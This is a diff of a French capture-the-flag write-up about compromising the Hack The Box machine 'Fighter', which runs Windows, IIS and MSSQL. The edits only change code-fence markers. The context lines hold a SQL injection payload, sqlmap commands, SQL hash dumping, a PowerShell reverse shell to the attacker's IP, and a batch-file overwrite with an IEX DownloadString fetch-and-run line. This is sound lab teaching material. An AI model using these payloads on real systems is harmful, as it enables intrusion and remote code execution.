@@ -31,7 +31,7 @@ La dernière annonce sur le site fait mention du domaine *streetfighterclub.htb*
 
 Retrouver l'espace membres a été aisé, j'ai seulement forgé l'entête HTTP Host et comparé la somme md5 du body des réponses :  
 
-```plain
+```
 devloop@kali:~$ curl -H "Host: streetfighterclub.htb" http://10.10.10.72/ |md5sum
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -98,7 +98,7 @@ with open(user_file) as fd:
 
 J'aurais tout aussi bien pu utiliser [Patator](https://github.com/lanjelot/patator) ou [Hydra](https://github.com/vanhauser-thc/thc-hydra) au vu de la faible complexité de l'authentification.  
 
-```plain
+```
 Trying user chun-li
 Trying user ryu
 Trying user blanka
@@ -122,7 +122,7 @@ Malheureusement la saisie de ces identifiants ne nous apporte rien de plus que l
 
 Devant ce piètre résultat je me suis ensuite penché sur le format des cookies obtenus qui contient des valeurs encodées en base64 :  
 
-```plain
+```
 Email=YWRtaW5Abm93aGVyZS5jb20%3D; path=/Level=MQ%3D%3D; path=/Chk=6253; path=/password=dGVzdA%3D%3D; expires=Sun, 02-Jun-2019 12:07:06 GMT; path=/username=YWRtaW4%3D; expires=Sun, 02-Jun-2019 12:07:06 GMT; path=/
 ```
 
@@ -132,7 +132,7 @@ Je me suis alors attaqué tout simplement aux paramètres du formulaire de login
 
 J'ai insisté dans cette direction et finalement trouvé le nombre de colonnes de la table courante (6) en augmentant le nombre d'entrées NULL dans une requête UNION :  
 
-```plain
+```
 username=admin&password=test&logintype=1%20union%20select%20null,null,null,null,null,null&rememberme=ON&B1=LogIn
 ```
 
@@ -146,7 +146,7 @@ Mais lors du lancement de ce dernier... nada. On est redirigé vers la page d'au
 
 On s'en sort finalement avec la commande suivante :  
 
-```plain
+```
 devloop@kali:~$ sqlmap -u 'http://members.streetfighterclub.htb/old/verify.asp' --referer 'http://members.streetfighterclub.htb/old/login.asp' --data 'username=admin&password=test&logintype=1&rememberme=ON&B1=LogIn' --risk 3 --level 5 -p logintype --dbms mssql --drop-set-cookie --random-agent --string "ERROR: Service not available"
         ___
        __H__
@@ -224,7 +224,7 @@ back-end DBMS: Microsoft SQL Server 2012
 
 Voici différentes informations que j'ai récupéré sur la machine en jouant avec les différentes options de *SQLmap* :  
 
-```plain
+```
 available databases [5]:
 [*] master
 [*] model
@@ -270,7 +270,7 @@ back-end DBMS: Microsoft SQL Server 2012
 
 Pour une raison inconnue, l'extraction des hashs des comptes SQL (via *--passwords*) ne fonctionnait pas mais en tapant la requête SQL directement (via l'invite obtenue avec l'option *--sql-shell*) cela fonctionne :  
 
-```plain
+```
 select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins [4]:
 [*] ##MS_PolicyEventProcessingLogin##, 0x0200bf9a95d75104265eb3ba0c429ffe6ca446d8d2445aaedd285e7d932b18e08329e946a00f22a0da6bba80239c0877c986f90db8f008267fe528dff1c9b97e3f1770cf4332
 [*] ##MS_PolicyTsqlExecutionLogin##, 0x02001a73788fcdcd9b341e140c8e24c22de85913c9107bbe0d662b5fc2ff523cfefb0961d578993e841d53326df4afc1d91c405ba833b84dd86f6c872272e5a17a1afea59fde
@@ -327,7 +327,7 @@ for cmd in cmds:
 
 Pour récupérer le contenu de la table (et donc le contenu du fichier) il suffit d'utiliser les options *-D web -T yoloout2 --dump* de *SQLmap* :  
 
-```plain
+```
 ; for 16-bit app support
 [fonts]
 [extensions]
@@ -350,7 +350,7 @@ MSSQL dispose de deux procédures de listing de dossiers qui ne sont pas documen
 
 Avec la requête *DROP TABLE yoloout2; CREATE TABLE yoloout2 (subdir varchar(512)); INSERT INTO yoloout2 EXEC master.dbo.xp\_subdirs 'c:\inetpub';* on crée une table dont les entrées sont les noms des sous-dossiers de *inetpub* :
 
-```plain
+```
 Database: web
 Table: YOLOOUT2
 [5 entries]
@@ -367,7 +367,7 @@ Table: YOLOOUT2
 
 Enfin ! On répète l'opération pour *wwwroot* :  
 
-```plain
+```
 +---------------+
 | SUBDIR        |
 +---------------+
@@ -381,7 +381,7 @@ Enfin ! On répète l'opération pour *wwwroot* :
 
 On en déduit que les scripts ASP sont situés dans *c:\inetpub\wwwroot\members\old*. On peut dès à présent dumper le contenu de *verify.asp* :  
 
-```plain
+```
 <%
 --- snip ---
 Dim Conn
@@ -481,7 +481,7 @@ La stacked-query suivante effectue un scan de port sortant vers ma machine :
 
 Et là l'orage fait place au soleil :  
 
-```plain
+```
 Capturing on 'tun0'
     1 0.000000000  10.10.10.72 → 10.10.15.208 TCP 52 49694 → 443 [SYN, ECN, CWR] Seq=0 Win=8192 Len=0 MSS=1357 WS=256 SACK_PERM=1
     2 0.000016130 10.10.15.208 → 10.10.10.72  TCP 40 443 → 49694 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
@@ -499,7 +499,7 @@ J'ai eu recours au script [Invoke-PowerShellTcp](https://github.com/samratashok/
 
 Il faut au préalable rajouter la commande powershell à la fin du fichier pour appeler la fonction de reverse shell avec notre adresse IP et port :  
 
-```plain
+```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.251 -Port 443
 ```
 
@@ -542,7 +542,7 @@ Round 2, Fight !
 
 Un *systeminfo* révèle un Windows 2012 R2 avec 159 correctifs appliqués, *\*gloups\** :  
 
-```plain
+```
 Host Name:                 FIGHTER
 OS Name:                   Microsoft Windows Server 2012 R2 Standard
 OS Version:                6.3.9600 N/A Build 9600
@@ -619,7 +619,7 @@ Les 20 secondes d'attente dans le script nous laissent le temps de stopper le se
 
 Et ça marche :  
 
-```plain
+```
 [*] Started reverse TCP handler on 10.10.15.59:443
 msf exploit(multi/handler) > [*] Sending stage (179783 bytes) to 10.10.10.72
 [*] Meterpreter session 1 opened (10.10.15.59:443 -> 10.10.10.72:49172) at 2018-08-18 14:34:27 +0200
@@ -652,7 +652,7 @@ Shun Goku Satsu
 
 Sur le système se trouve un utilisateur baptisé *decoder* qui possède un script *clean.bat* word-writable :  
 
-```plain
+```
 PS C:\users\decoder> dir
 
     Directory: C:\users\decoder
@@ -691,7 +691,7 @@ Ce fichier est intéressant car si on lance powershell depuis le .bat il devrait
 
 Mais comment éditer un fichier de cette façon sous Windows ? Là encore PowerShell nous vient en aide :  
 
-```plain
+```
 $strings = @()
 $strings += "c:/windows/system32/windowspowershell/v1.0/powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.59:443/reflection.ps1')"
 $strings | Set-Content "c:\users\decoder\clean.bat"
@@ -708,7 +708,7 @@ You win !
 
 A ce stade on parvient bien sûr à obtenir le flag de l'utilisateur *decoder* (bb6163c184f203af2a31a9c035934297) mais surprise quand on souhaite obtenir le flag de l'administrateur :  
 
-```plain
+```
 PS C:\users\administrator\desktop> dir
 
     Directory: C:\users\administrator\desktop
@@ -740,7 +740,7 @@ La seule difficulté dans ce code c'est l'instruction *sub* à 0x10001008 qui s'
 
 Le décodage se fait en une ligne de Python :  
 
-```plain
+```
 >>> "".join([chr(ord(c) ^ 9) for c in "Fm`fEhOl}h"])
 'OdioLaFeta'
 ```
